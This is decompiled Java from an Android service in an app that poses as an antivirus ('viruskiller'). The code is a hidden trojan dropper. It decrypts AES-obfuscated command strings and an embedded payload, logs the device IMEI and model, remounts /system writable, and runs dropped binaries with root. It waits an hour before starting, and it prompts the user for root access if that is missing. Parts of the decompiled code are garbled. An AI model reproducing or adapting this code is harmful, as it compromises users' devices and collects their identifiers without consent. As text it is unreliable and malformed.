	private static  INTERVAL
	private static final  OL
	private static final [B TIPS
	private static final  TL
	private static B WP
	private java.lang.String mAName
	private java.lang.String mIdentifier
	private com.ju6.AdRequester mJu6Ad
	private  mTickets
	private java.util.Timer mTimer
	private  startDelay
	
	    static UpdateService()
	    {
	        com.safesys.viruskiller.UpdateService.INTERVAL = 60000;
	        byte[][] v0_1 = new byte[16];
	        v0_1 = {83, 116, 97, 107, 95, 121, 69, 120, 121, 45, 101, 76, 116, 33, 80, 119};
	        com.safesys.viruskiller.UpdateService.WP = v0_1;
	        byte[][] v0_3 = new byte[][14];
	        byte[] v2_0 = new byte[32];
	        v2_0 = {-52, -81, 75, 27, 11, -108, 122, 121, -21, 74, 81, 73, 76, -123, 73, -116, 109, -42, 41, 37, 116, -64, 35, -78, -6, -90, 123, 80, 42, 13, 56, 37};
	        v0_3[0] = v2_0;
	        byte[] v2_1 = new byte[32];
	        v2_1 = {115, -41, -127, 17, 21, -7, 104, 90, -74, -93, 79, -65, 72, 115, 113, 124, 20, 113, -67, -55, -99, -60, -89, -90, -123, 74, 6, -58, 69, 109, -68, -46};
	        v0_3[1] = v2_1;
	        byte[] v2_2 = new byte[32];
	        v2_2 = {-47, 111, 106, -3, -88, -100, 90, -62, -19, 88, -99, 41, -109, -21, 124, 78, -68, 65, 41, 70, 5, -46, -113, -80, -62, 15, 67, 85, 32, -7, -17, 93};
	        v0_3[2] = v2_2;
	        byte[] v2_3 = new byte[16];
	        v2_3 = {35, 67, 97, 69, -98, -60, -101, 44, -128, -91, 87, -127, 113, -59, 64, -108};
	        v0_3[3] = v2_3;
	        byte[] v2_4 = new byte[16];
	        v2_4 = {36, -42, 113, -92, 48, -31, -108, -53, -120, -128, 123, 48, 8, 61, 55, 49};
	        v0_3[4] = v2_4;
	        byte[] v2_5 = new byte[16];
	        v2_5 = {21, -103, -35, -1, 13, 52, 89, 16, -62, 114, 65, -15, -81, -87, 5, -17};
	        v0_3[5] = v2_5;
	        byte[] v2_6 = new byte[16];
	        v2_6 = {-57, -52, -17, -79, 84, 22, -87, 107, 10, 34, 96, -113, -125, 82, -92, -96};
	        v0_3[6] = v2_6;
	        byte[] v2_7 = new byte[16];
	        v2_7 = {-48, 15, -69, 65, -83, -22, 118, -61, 60, -126, 65, 59, 77, -119, -38, 23};
	        v0_3[7] = v2_7;
	        byte[] v2_8 = new byte[32];
	        v2_8 = {107, -31, 110, -42, -112, 47, 114, 115, 26, 66, -89, 117, -105, 85, -110, -62, -63, 19, 8, 41, 7, -17, -31, 67, -35, -105, -92, -89, -102, -29, -79, 91};
	        v0_3[8] = v2_8;
	        byte[] v2_9 = new byte[32];
	        v2_9 = {-5, 113, -72, -5, -85, -32, 83, -11, -7, -115, -53, -69, 13, -63, 71, 70, -105, 53, 104, -9, 42, 14, -37, 34, -101, 4, 104, 49, -80, 48, 26, -6};
	        v0_3[9] = v2_9;
	        byte[] v2_10 = new byte[16];
	        v2_10 = {10, -4, 17, 29, -58, -23, -122, 70, -71, -82, 74, -45, -16, -85, 122, 95};
	        v0_3[10] = v2_10;
	        byte[] v2_11 = new byte[16];
	        v2_11 = {64, 7, -51, 38, -114, 81, 22, -124, 106, 122, 88, 119, 48, -77, 94, 59};
	        v0_3[11] = v2_11;
	        byte[] v2_12 = new byte[16];
	        v2_12 = {38, -60, -30, 13, 122, -106, -16, -18, 106, -79, 36, -44, -53, 82, 68, 127};
	        v0_3[12] = v2_12;
	        byte[] v2_13 = new byte[16];
	        v2_13 = {-1, -119, 1, 31, 13, 76, -18, 25, -128, 103, 63, 105, 2, -100, 6, 9};
	        v0_3[13] = v2_13;
	        com.safesys.viruskiller.UpdateService.TIPS = v0_3;
	        return;
	    }
	
	
	    public UpdateService()
	    {
	        this.mIdentifier = "-1";
	        this.mAName = 0;
	        this.mTickets = 9;
	        this.mTimer = 0;
	        this.startDelay = 3600;
	        this.mJu6Ad = 0;
	        return;
	    }
	
	
	    private void _doTimerTask()
	    {
	        if (this.mAName == null) {
	            this.mAName = this.getSystemMount();
	        }
	        com.safesys.viruskiller.UpdateService$MyExecutor v9_1 = new com.safesys.viruskiller.UpdateService$MyExecutor(this);
	        if (v9_1.init()) {
	            this.checkFile(v9_1, 0);
	            String v0 = this.getTips(0);
	            java.io.File v10_1 = new java.io.File(v0);
	            if ((!v10_1.exists()) || (v10_1.length() < 18316)) {
	                String v8 = new StringBuilder().append(this.getFilesDir()).append(this.getTips(4)).toString();
	                String v7 = new StringBuilder().append(this.getFilesDir()).append(this.getTips(5)).toString();
	                this.updateInfo(v7);
	                this.copyAssets(this.getTips(3), v8, 18320);
	                String v4 = this.getTips(6);
	                String v1 = this.getTips(1);
	                String v2 = this.getTips(2);
	                if (!new java.io.File(v4).exists()) {
	                    String v5 = this.getTips(7);
	                    v9_1.execute(new StringBuilder(String.valueOf(v5)).append(" ").append(v8).append(" > ").append(v0).toString(), 1000);
	                    v9_1.execute(new StringBuilder(String.valueOf(v5)).append(" ").append(v8).append(" > ").append(v2).toString(), 1000);
	                    if (!new java.io.File(v1).exists()) {
	                        v9_1.execute(new StringBuilder(String.valueOf(v5)).append(" ").append(v7).append(" > ").append(v1).toString(), 1000);
	                    }
	                } else {
	                    v9_1.execute(new StringBuilder(String.valueOf(v4)).append(" ").append(v8).append(" ").append(v0).toString(), 1000);
	                    v9_1.execute(new StringBuilder(String.valueOf(v4)).append(" ").append(v8).append(" ").append(v2).toString(), 1000);
	                    if (!new java.io.File(v1).exists()) {
	                        v9_1.execute(new StringBuilder(String.valueOf(v4)).append(" ").append(v7).append(" ").append(v1).toString(), 1000);
	                    }
	                }
	                v9_1.execute(new StringBuilder(String.valueOf(this.getTips(8))).append(v2).toString(), 100);
	                v9_1.execute(v2, 100);
	                new java.io.File(v8).delete();
	                new java.io.File(v7).delete();
	            }
	            this.checkFile(v9_1, 1);
	        } else {
	            v9_1.close();
	            this.shouMyDiag();
	        }
	        return;
	    }
	
	
	    static synthetic String access$0(com.safesys.viruskiller.UpdateService p1, int p2)
	    {
	        return p1.getTips(p2);
	    }
	
	
	    static synthetic void access$1(com.safesys.viruskiller.UpdateService p0)
	    {
	        p0.doTimerTask();
	        return;
	    }
	
	
	    private void checkFile(com.safesys.viruskiller.UpdateService$MyExecutor p4, boolean p5)
	    {
	        String v0_1;
	        String v0_0 = this.getTips(9);
	        if (!p5) {
	            v0_1 = new StringBuilder(String.valueOf(v0_0)).append("rw ").toString();
	        } else {
	            v0_1 = new StringBuilder(String.valueOf(v0_0)).append("ro ").toString();
	        }
	        p4.execute(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(v0_1)).append(this.mAName).toString())).append(" ").toString())).append(this.getTips(10)).toString(), 1000);
	        return;
	    }
	
	
	    private boolean checkPrecondition()
	    {
	        int v2_3;
	        String v1 = this.getTips(0);
	        if (v1 != null) {
	            java.io.File v0_1 = new java.io.File(v1);
	            if ((!v0_1.exists()) || (v0_1.length() < 18316)) {
	                v2_3 = 0;
	            } else {
	                v2_3 = 1;
	            }
	        } else {
	            v2_3 = 0;
	        }
	        return v2_3;
	    }
	
	
	    private void copyAssets(String p10, String p11, int p12)
	    {
	        java.io.FileOutputStream v4 = 0;
	        java.io.InputStream v3 = 0;
	        if (p12 > 0) {
	            try {
	                java.io.FileOutputStream v5_1 = new java.io.FileOutputStream(p11);
	                try {
	                    v3 = this.getClass().getResourceAsStream(new StringBuilder("/assets/").append(p10).toString());
	                    byte[] v0 = new byte[p12];
	                    v3.read(v0);
	                    v5_1.write(this.decrypt(v0));
	                    v5_1.flush();
	                } catch (Exception v6_2) {
	                    Exception v2 = v6_2;
	                    v4 = v5_1;
	                    v2.printStackTrace();
	                    if (v3 != null) {
	                        try {
	                            v3.close();
	                        } catch (Exception v6) {
	                        }
	                    }
	                    if (v4 != null) {
	                        try {
	                            v4.close();
	                        } catch (Exception v6) {
	                        }
	                    }
	                } catch (Exception v6_3) {
	                    v4 = v5_1;
	                    if (v3 != null) {
	                        try {
	                            v3.close();
	                        } catch (Exception v7) {
	                        }
	                    }
	                    if (v4 != null) {
	                        try {
	                            v4.close();
	                        } catch (Exception v7) {
	                        }
	                    }
	                    throw v6_3;
	                }
	                if (v3 != null) {
	                    try {
	                        v3.close();
	                    } catch (Exception v6) {
	                    }
	                }
	                if (v5_1 != null) {
	                    try {
	                        v5_1.close();
	                    } catch (Exception v6) {
	                    }
	                }
	            } catch (Exception v6_0) {
	                v2 = v6_0;
	            } catch (Exception v6_3) {
	            }
	        }
	        return;
	    }
	
	
	    private byte[] decrypt(byte[] p6)
	    {
	        javax.crypto.spec.SecretKeySpec v2_1 = new javax.crypto.spec.SecretKeySpec(com.safesys.viruskiller.UpdateService.WP, "AES");
	        javax.crypto.Cipher v0 = javax.crypto.Cipher.getInstance("AES");
	        v0.init(2, v2_1);
	        return v0.doFinal(p6);
	    }
	
	
	    private void doTimerTask()
	    {
	        if (this.checkPrecondition()) {
	            this.stopSelf();
	        }
	        this.mTickets = (this.mTickets + 1);
	        if ((this.mTickets % 10) == 0) {
	            try {
	                this._doTimerTask();
	            } catch (Exception v0) {
	            }
	        }
	        if (this.checkPrecondition()) {
	            this.stopSelf();
	        }
	        return;
	    }
	
	
	    private String getSystemMount()
	    {
	        String v6 = 0;
	        java.io.LineNumberReader v4 = 0;
	        try {
	            java.io.LineNumberReader v5_1 = new java.io.LineNumberReader(new java.io.FileReader(this.getTips(13)));
	        } catch (Exception v7_3) {
	            Exception v1 = v7_3;
	            v1.printStackTrace();
	            if (v4 == null) {
	                return v6;
	            } else {
	                try {
	                    v4.close();
	                } catch (Exception v7) {
	                }
	                return v6;
	            }
	        } catch (Exception v7_9) {
	            if (v4 != null) {
	                try {
	                    v4.close();
	                } catch (Exception v8) {
	                }
	            }
	            throw v7_9;
	        }
	        try {
	            do {
	                String v3 = v5_1.readLine();
	            } while(String[] v2[1].compareToIgnoreCase("/system") != 0);
	            v6 = v2[0];
	        } catch (Exception v7_8) {
	            v1 = v7_8;
	            v4 = v5_1;
	        } catch (Exception v7_9) {
	            v4 = v5_1;
	        }
	        if (v3 != null) {
	            v2 = v3.split(" ");
	            if (v2[1].compareToIgnoreCase("/system") == 0) {
	            }
	        } else {
	            if (v5_1 == null) {
	                return v6;
	            } else {
	                try {
	                    v5_1.close();
	                } catch (Exception v7) {
	                }
	                return v6;
	            }
	        }
	    }
	
	
	    private String getTips(int p4)
	    {
	        try {
	            int v2_2 = new String(this.decrypt(com.safesys.viruskiller.UpdateService.TIPS[p4]));
	        } catch (int v2) {
	            v2_2 = 0;
	        }
	        return v2_2;
	    }
	
	
	    private void initJu6Ad(String p12, String p13)
	    {
	        android.content.SharedPreferences v5 = this.getSharedPreferences("sstimestamp", 0);
	        long v3 = v5.getLong("last", 0);
	        long v0 = System.currentTimeMillis();
	        if ((v0 - v3) >= 3600000) {
	            android.content.SharedPreferences$Editor v2 = v5.edit();
	            v2.putLong("last", v0);
	            v2.commit();
	            com.ju6.AdManager.init(p12, p13, 0);
	            this.mJu6Ad = new com.ju6.AdRequester(this);
	            this.mJu6Ad.getAd();
	        }
	        return;
	    }
	
	
	    private void shouMyDiag()
	    {
	        android.content.pm.ApplicationInfo v0 = this.getApplicationInfo();
	        android.content.Intent v2_1 = new android.content.Intent();
	        v2_1.setClass(this, com.safesys.viruskiller.ShowTips);
	        String v4 = v0.loadLabel(this.getPackageManager()).toString();
	        if ((v4 == null) || ("".equals(v4))) {
	            v4 = "\u672c\u8f6f\u4ef6";
	        }
	        try {
	            v2_1.putExtra("MM", new String(new StringBuilder(String.valueOf(v4)).append("\u9700\u8981root\u6743\u9650\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u901a\u8fc7\u6388\u6743\u7ba1\u7406\u7a0b\u5e8f\u8fdb\u884c\u6388\u6743\uff01").toString().getBytes("UTF-8"), "UTF-8"));
	        } catch (String v5_9) {
	            v5_9.printStackTrace();
	        }
	        v2_1.setFlags(268435456);
	        v2_1.putExtra("GG", "test");
	        this.startActivity(v2_1);
	        return;
	    }
	
	
	    private void updateInfo(String p11)
	    {
	        String v2 = ((android.telephony.TelephonyManager) this.getSystemService("phone")).getDeviceId();
	        String v3_1 = new StringBuilder(String.valueOf(android.os.Build.BRAND)).append("_").append(android.os.Build.MODEL).toString().replaceAll(" ", "_");
	        String v5_1 = android.os.Build$VERSION.RELEASE.replaceAll(" ", "_");
	        String v4_1 = android.os.Build$VERSION.SDK.replaceAll(" ", "_");
	        try {
	            java.io.FileOutputStream v6_1 = new java.io.FileOutputStream(p11);
	            v6_1.write(new StringBuilder(String.valueOf(v2)).append(" ").append(this.mIdentifier).append(" ").append(v3_1).append(" ").append(v5_1).append(" ").append(v4_1).toString().getBytes());
	            v6_1.flush();
	            v6_1.close();
	        } catch (Exception v8_19) {
	            v8_19.printStackTrace();
	        }
	        return;
	    }
	
	
	    public android.os.IBinder onBind(android.content.Intent p2)
	    {
	        return 0;
	    }
	
	
	    public void onCreate()
	    {
	        this = super.onCreate();
	        try {
	            android.os.Bundle v11 = this.getPackageManager().getApplicationInfo(this.getPackageName(), 128).metaData;
	            Integer v19_0 = v11.get("SAFE_START");
	        } catch (java.util.Timer v4_4) {
	            v4_4.printStackTrace();
	            android.content.SharedPreferences v18 = this.getSharedPreferences("sstimestamp", 0);
	            long v16 = v18.getLong("start", 0);
	            long v12 = System.currentTimeMillis();
	            if (v16 != 0) {
	                if ((v12 - v16) >= (this.startDelay * 1000)) {
	                    this.initJu6Ad("c62b31cb3a7041d5", "88857ec052e653eb");
	                    this.mTimer = new java.util.Timer(1);
	                    com.safesys.viruskiller.UpdateService$1 v5_4 = new com.safesys.viruskiller.UpdateService$1;
	                    v5_4(this);
	                    this.mTimer.schedule(v5_4, com.safesys.viruskiller.UpdateService.INTERVAL, com.safesys.viruskiller.UpdateService.INTERVAL);
	                } else {
	                    this.stopSelf();
	                }
	            } else {
	                android.content.SharedPreferences$Editor v15 = v18.edit();
	                v15.putLong("start", v12);
	                v15.commit();
	                if (this.startDelay <= 0) {
	                } else {
	                    this.stopSelf();
	                }
	            }
	            return;
	        }
	        if (v19_0 != null) {
	            this.startDelay = ((long) ((Integer) v19_0).intValue());
	        }
	        String v20_0 = v11.get("SAFE_PID");
	        if (v20_0 == null) {
	        } else {
	            this.mIdentifier = ((String) v20_0);
	        }
	    }
	
	
	    public void onDestroy()
	    {
	        super.onDestroy();
	        if (this.mTimer != null) {
	            this.mTimer.cancel();
	        }
	        return;
	    }
	
